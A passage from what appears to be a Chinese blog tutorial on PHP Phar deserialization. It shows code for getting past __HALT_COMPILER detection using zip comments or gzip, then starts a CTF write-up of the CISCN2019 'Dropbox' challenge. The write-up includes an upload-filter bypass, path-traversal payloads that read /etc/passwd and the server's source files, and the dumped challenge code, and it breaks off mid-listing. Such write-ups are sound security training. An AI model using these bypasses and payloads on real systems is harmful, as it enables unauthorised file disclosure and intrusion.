comment\">//使用zlib协议进行绕过</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"绕过-HALT-COMPILER检测\"><a href=\"#绕过-HALT-COMPILER检测\" class=\"headerlink\" title=\"绕过__HALT_COMPILER检测\"></a>绕过__HALT_COMPILER检测</h2><p>我们在前文初识Phar时就提到过，PHP通过<code>__HALT_COMPILER</code>来识别Phar文件，那么出于安全考虑，即为了防止Phar反序列化的出现，可能就会对这个进行过滤，示例代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/HALT_COMPILER/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Phar</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里的话绕过思路有两个<br>1、将Phar文件的内容写到压缩包注释中，压缩为zip文件，示例代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$zip</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ZipArchive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$zip</span><span class=\"token operator\">-></span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phar.zip'</span><span class=\"token punctuation\">,</span><span class=\"token class-name static-context\">ZipArchive</span><span class=\"token operator\">::</span><span class=\"token constant\">CREATE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$zip</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'flag is here'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$zip</span><span class=\"token operator\">-></span><span class=\"token function\">setArchiveComment</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$zip</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>2、将生成的Phar文件进行gzip压缩，压缩命令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">gzip test<span class=\"token operator\">.</span>phar<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>效果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205885.png\" alt=\"在这里插入图片描述\"><br>压缩后同样也可以进行反序列化</p>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"CISCN2019-华北赛区-Day1-Web1-Dropbox\"><a href=\"#CISCN2019-华北赛区-Day1-Web1-Dropbox\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day1 Web1]Dropbox\"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>打开靶场<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205911.png\" alt=\"在这里插入图片描述\"><br>发现是个登录界面，可以进行注册，随便注册一下登录<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205642.png\" alt=\"在这里插入图片描述\"><br>登录后发现仅存在一个文件上传<br>抓下包，尝试上传文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205072.png\" alt=\"在这里插入图片描述\"><br>发现有过滤，这里尝试用修改<code>Content-Type</code>来实现绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205091.png\" alt=\"在这里插入图片描述\"><br>成功上传，查看网页界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205257.png\" alt=\"在这里插入图片描述\"><br>发现只存在下载和删除两个功能，抓一下下载的包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205339.png\" alt=\"在这里插入图片描述\"><br>这个参数感觉有点东西，尝试读取一下其他文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">filename<span class=\"token operator\">=</span><span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205394.png\" alt=\"在这里插入图片描述\"><br>此时想的是直接读取Flag文件，但尝试读取Flag文件后无果（未找到flag.php文件），只能从其他方面着手，这里我们发现存在下载和删除功能，盲猜有<code>download.php</code>和<code>delete.php</code>文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">filename<span class=\"token operator\">=</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>download<span class=\"token operator\">.</span>php\nfilename<span class=\"token operator\">=</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>delete<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205447.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"># download.php\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Location: login.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"open_basedir\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\":/etc:/tmp\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">40</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type: application/octet-stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Disposition: attachment; filename=\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"File not exist\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"># delete.php\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Location: login.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">40</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token function\">detele</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"success\"</span> <span class=\"token operator\">=></span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"error\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"success\"</span> <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"error\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"File not exist\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现这两个文件都包含了<code>class.php</code>，因此我们再查看一下<code>class.php</code>文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//原文过程，这里缩减了很多，只截取了用到的部分\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbaddr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbuser</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbpass</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbname</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"dropbox\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbaddr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">global</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">db</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">FileList</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$results</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$funcs</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">results</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">funcs</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filenames</span> <span class=\"token operator\">=</span> <span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_search</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$filenames</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filenames</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_search</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$filenames</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filenames</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">funcs</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">files</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">results</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token variable\">$func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$table</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;div id=\"container\" class=\"container\">&lt;div class=\"table-responsive\">&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\">'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;thead>&lt;tr>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">funcs</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;th scope=\"col\" class=\"text-center\">'</span> <span class=\"token operator\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/th>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;th scope=\"col\" class=\"text-center\">Opt&lt;/th>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;/thead>&lt;tbody>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">results</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;tr>'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$func</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;td class=\"text-center\">'</span> <span class=\"token operator\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/td>'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;td class=\"text-center\" filename=\"'</span> <span class=\"token operator\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\">&lt;a href=\"#\" class=\"download\">下载&lt;/a> / &lt;a href=\"#\" class=\"delete\">删除&lt;/a>&lt;/td>'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$table</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;/tr>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$table</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token 